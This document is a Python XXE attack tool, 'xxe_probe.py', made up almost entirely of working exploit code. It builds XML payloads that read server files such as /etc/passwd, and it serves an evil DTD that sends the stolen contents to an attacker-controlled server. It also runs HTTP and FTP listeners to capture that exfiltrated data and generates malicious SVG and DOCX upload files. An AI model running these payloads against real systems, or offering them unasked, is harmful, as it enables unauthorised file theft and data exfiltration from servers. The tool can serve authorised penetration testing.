#!/usr/bin/env python3
"""
xxe_probe.py — XXE tester with OOB detection, FTP server, and DOCX/SVG generation
Dependencies: pip install requests colorama

Usage examples:
  # Test visible file read
  python3 xxe_probe.py -u https://target.com/api/xml -f /etc/passwd

  # Blind OOB confirmation (DNS/HTTP)
  python3 xxe_probe.py -u https://target.com/api/xml --oob http://YOUR-SERVER/

  # Host malicious DTD and receive exfil
  python3 xxe_probe.py --dtd-server --port 80 --file /etc/passwd

  # Built-in FTP server for FTP-based exfil
  python3 xxe_probe.py --ftp-server --port 2121

  # Generate malicious SVG for upload testing
  python3 xxe_probe.py --gen-svg --oob http://YOUR-SERVER/ -o malicious.svg

  # Generate malicious DOCX for upload testing
  python3 xxe_probe.py --gen-docx --oob http://YOUR-SERVER/ -o malicious.docx

  # Test content-type switching (JSON → XML)
  python3 xxe_probe.py -u https://target.com/api/data --switch-ct --oob http://YOUR-SERVER/

  # Auth: cookie or bearer token
  python3 xxe_probe.py -u https://target.com/api/xml -f /etc/passwd --cookie "session=abc"
  python3 xxe_probe.py -u https://target.com/api/xml -f /etc/passwd --token "eyJ..."
"""

import argparse
import base64
import io
import json
import os
import socket
import sys
import threading
import time
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote, urlparse

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("Missing dependencies. Run: pip install requests colorama")
    sys.exit(1)

TIMEOUT = 15

# ─────────────────────────────────────────────
# Payload templates
# ─────────────────────────────────────────────

def payload_classic_file(filepath):
    return f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root><data>&xxe;</data></root>"""


def payload_oob_dtd(dtd_url):
    return f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "{dtd_url}">
  %remote;
]>
<root/>"""


def payload_xinclude_file(filepath):
    return f"""<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file://{filepath}"/>
</data>"""


def payload_xinclude_ssrf(url):
    return f"""<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{url}"/>
</data>"""


def evil_dtd_content(oob_base_url, filepath):
    return f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={filepath}">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '{oob_base_url}?data=%file;'>">
%wrap;
%send;
"""


def evil_dtd_basic(oob_base_url, filepath):
    return f"""<!ENTITY % file SYSTEM "file://{filepath}">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '{oob_base_url}?data=%file;'>">
%wrap;
%send;
"""


# ─────────────────────────────────────────────
# SVG / DOCX generation
# ─────────────────────────────────────────────

def generate_svg(oob_url=None, filepath=None):
    if oob_url:
        return f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "{oob_url}evil.dtd">
  %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <circle cx="100" cy="100" r="80" fill="red"/>
</svg>"""
    elif filepath:
        return f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text font-size="10" x="0" y="20">&xxe;</text>
</svg>"""


def generate_docx(oob_url=None, filepath=None):
    """Create a minimal .docx (Office Open XML) with XXE in word/document.xml."""
    if oob_url:
        doc_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "{oob_url}evil.dtd">
  %remote;
]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>Test document</w:t></w:r></w:p></w:body>
</w:document>"""
    elif filepath:
        doc_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>"""
    else:
        return None

    content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"""

    rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
</Relationships>"""

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('[Content_Types].xml', content_types)
        z.writestr('_rels/.rels', rels)
        z.writestr('word/document.xml', doc_xml)
    return buf.getvalue()


# ─────────────────────────────────────────────
# DTD / HTTP server
# ─────────────────────────────────────────────

received_data = []

class DTDHandler(BaseHTTPRequestHandler):
    dtd_content = ""

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path.endswith('evil.dtd'):
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(self.dtd_content.encode())
            print(f"{Fore.CYAN}[DTD served] evil.dtd requested by {self.client_address[0]}")
        else:
            data = unquote(parsed.query.replace('data=', '', 1))
            if data:
                received_data.append(data)
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}[EXFIL RECEIVED from {self.client_address[0]}]")
                try:
                    decoded = base64.b64decode(data).decode(errors='replace')
                    print(f"{Fore.GREEN}[BASE64 DECODED]\n{decoded}")
                except Exception:
                    print(f"{Fore.GREEN}[RAW DATA]\n{data}")
                print(f"{Fore.GREEN}{'='*60}\n")
            else:
                print(f"{Fore.YELLOW}[OOB HIT] {self.path} from {self.client_address[0]}")
            self.send_response(200)
            self.end_headers()

    def log_message(self, *args):
        pass


# ─────────────────────────────────────────────
# FTP server for FTP-based OOB exfil
# ─────────────────────────────────────────────

class FTPHandler(threading.Thread):
    def __init__(self, port=2121):
        super().__init__(daemon=True)
        self.port = port

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('', self.port))
        srv.listen(5)
        print(f"{Fore.CYAN}[FTP Server] Listening on port {self.port}")
        while True:
            try:
                conn, addr = srv.accept()
                t = threading.Thread(target=self._handle, args=(conn, addr), daemon=True)
                t.start()
            except Exception:
                break

    def _handle(self, conn, addr):
        print(f"{Fore.YELLOW}[FTP] Connection from {addr}")
        conn.send(b"220 FTP XXE Capture Server\r\n")
        data = b""
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                conn.send(b"200 OK\r\n")
        except Exception:
            pass
        finally:
            if data:
                print(f"{Fore.GREEN}[FTP EXFIL from {addr}]\n{data.decode(errors='replace')}\n")
            conn.close()


# ─────────────────────────────────────────────
# Core probe logic
# ─────────────────────────────────────────────

def build_session(cookie=None, token=None):
    s = requests.Session()
    s.headers['User-Agent'] = 'Mozilla/5.0 (Security Researcher)'
    if cookie:
        for part in cookie.split(';'):
            part = part.strip()
            if '=' in part:
                name, _, value = part.partition('=')
                s.cookies.set(name.strip(), value.strip())
    if token:
        s.headers['Authorization'] = f'Bearer {token}'
    return s


def probe_visible(session, url, filepath):
    payload = payload_classic_file(filepath)
    print(f"{Fore.CYAN}[*] Testing visible file read: {filepath}")
    try:
        r = session.post(url, data=payload,
                         headers={'Content-Type': 'application/xml'},
                         timeout=TIMEOUT, allow_redirects=True)
        print(f"    Status: {r.status_code} | Length: {len(r.text)}")
        if 'root:' in r.text or 'daemon:' in r.text or '[boot loader]' in r.text:
            print(f"{Fore.GREEN}[VULN] File contents reflected in response!")
            print(f"{Fore.GREEN}{r.text[:500]}")
            return True
        elif filepath.split('/')[-1] in r.text or filepath.split('\\')[-1] in r.text:
            print(f"{Fore.GREEN}[POSSIBLE] Partial filename match in response — check manually")
            print(r.text[:300])
        else:
            print(f"{Fore.YELLOW}    No file content detected in response")
            if len(r.text) < 2000:
                print(f"    Response: {r.text[:300]}")
    except Exception as e:
        print(f"{Fore.RED}    Request failed: {e}")
    return False


def probe_oob(session, url, dtd_url):
    payload = payload_oob_dtd(dtd_url)
    print(f"{Fore.CYAN}[*] Testing OOB via external DTD: {dtd_url}")
    try:
        r = session.post(url, data=payload,
                         headers={'Content-Type': 'application/xml'},
                         timeout=TIMEOUT)
        print(f"    Status: {r.status_code} | Length: {len(r.text)}")
    except Exception as e:
        print(f"{Fore.YELLOW}    Request error (may be expected): {e}")


def probe_xinclude(session, url, filepath):
    payload = payload_xinclude_file(filepath)
    print(f"{Fore.CYAN}[*] Testing XInclude file read: {filepath}")
    try:
        r = session.post(url, data=payload,
                         headers={'Content-Type': 'application/xml'},
                         timeout=TIMEOUT)
        print(f"    Status: {r.status_code} | Length: {len(r.text)}")
        if 'root:' in r.text or 'daemon:' in r.text:
            print(f"{Fore.GREEN}[VULN via XInclude] File contents reflected!")
            print(f"{Fore.GREEN}{r.text[:500]}")
    except Exception as e:
        print(f"{Fore.RED}    Request failed: {e}")


def probe_switch_ct(session, url, oob_url):
    """Try switching Content-Type from JSON to XML."""
    print(f"{Fore.CYAN}[*] Testing Content-Type switch (JSON → XML)")
    payload = payload_oob_dtd(oob_url + 'evil.dtd')
    try:
        r = session.post(url, data=payload,
                         headers={'Content-Type': 'application/xml'},
                         timeout=TIMEOUT)
        print(f"    XML CT → Status: {r.status_code}")
        r2 = session.post(url, data=payload,
                          headers={'Content-Type': 'text/xml'},
                          timeout=TIMEOUT)
        print(f"    text/xml CT → Status: {r2.status_code}")
    except Exception as e:
        print(f"{Fore.RED}    Request failed: {e}")


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description='XXE Phantom — XXE probe and helper tool')
    p.add_argument('-u', '--url', help='Target URL (XML POST endpoint)')
    p.add_argument('-f', '--file', default='/etc/passwd', help='File to read (default: /etc/passwd)')
    p.add_argument('--oob', help='OOB base URL (e.g. http://YOUR-SERVER/)')
    p.add_argument('--cookie', help='Cookie string (key=val; key2=val2)')
    p.add_argument('--token', help='Bearer token')
    p.add_argument('--xinclude', action='store_true', help='Also test XInclude payload')
    p.add_argument('--switch-ct', action='store_true', help='Test Content-Type switching')
    # Server modes
    p.add_argument('--dtd-server', action='store_true', help='Start HTTP server serving evil.dtd + capture exfil')
    p.add_argument('--ftp-server', action='store_true', help='Start FTP server for FTP-based OOB exfil')
    p.add_argument('--port', type=int, default=80, help='Port for DTD/FTP server (default: 80)')
    # Generation modes
    p.add_argument('--gen-svg', action='store_true', help='Generate malicious SVG for upload testing')
    p.add_argument('--gen-docx', action='store_true', help='Generate malicious DOCX for upload testing')
    p.add_argument('-o', '--output', help='Output file for generated payload')
    args = p.parse_args()

    # ── Server modes ──
    if args.ftp_server:
        ftp = FTPHandler(port=args.port)
        ftp.run_as_main = True
        print(f"{Fore.CYAN}[*] FTP exfil server started on port {args.port}")
        print(f"    Use in evil.dtd: ftp://YOUR-IP:{args.port}/%file;")
        print(f"    Press Ctrl+C to stop\n")
        ftp.run()
        return

    if args.dtd_server:
        oob_base = f"http://YOUR-SERVER:{args.port}/"
        file_path = args.file
        DTDHandler.dtd_content = evil_dtd_content(oob_base, file_path)
        print(f"{Fore.CYAN}[*] DTD HTTP server on port {args.port}")
        print(f"    Serving evil.dtd for file: {file_path}")
        print(f"    OOB base URL: {oob_base}")
        print(f"\n    Inject this payload:\n")
        print(payload_oob_dtd(oob_base + 'evil.dtd'))
        print(f"\n{Fore.YELLOW}    [Waiting for connections — Ctrl+C to stop]\n")
        srv = HTTPServer(('', args.port), DTDHandler)
        try:
            srv.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Fore.CYAN}[*] Stopped. Received {len(received_data)} exfil hit(s).")
        return

    # ── Generation modes ──
    if args.gen_svg:
        content = generate_svg(oob_url=args.oob, filepath=args.file if not args.oob else None)
        out = args.output or 'malicious.svg'
        with open(out, 'w') as f:
            f.write(content)
        print(f"{Fore.GREEN}[+] SVG written to {out}")
        print(f"    Upload to target and check OOB server for callback")
        return

    if args.gen_docx:
        content = generate_docx(oob_url=args.oob, filepath=args.file if not args.oob else None)
        out = args.output or 'malicious.docx'
        with open(out, 'wb') as f:
            f.write(content)
        print(f"{Fore.GREEN}[+] DOCX written to {out}")
        print(f"    Upload to target and check OOB server for callback")
        return

    # ── Probe mode ──
    if not args.url:
        p.print_help()
        return

    session = build_session(args.cookie, args.token)

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN} XXE Phantom — Target: {args.url}")
    print(f"{Fore.CYAN}{'='*60}\n")

    # Test 1: visible file read
    probe_visible(session, args.url, args.file)

    # Test 2: OOB
    if args.oob:
        print()
        # Start background DTD server if oob is local
        dtd_url = args.oob.rstrip('/') + '/evil.dtd'
        probe_oob(session, args.url, dtd_url)
        print(f"{Fore.YELLOW}    → Check your OOB server for DNS/HTTP callbacks")

    # Test 3: XInclude
    if args.xinclude:
        print()
        probe_xinclude(session, args.url, args.file)

    # Test 4: Content-Type switch
    if args.switch_ct and args.oob:
        print()
        probe_switch_ct(session, args.url, args.oob)

    print(f"\n{Fore.CYAN}[*] Done.")


if __name__ == '__main__':
    main()
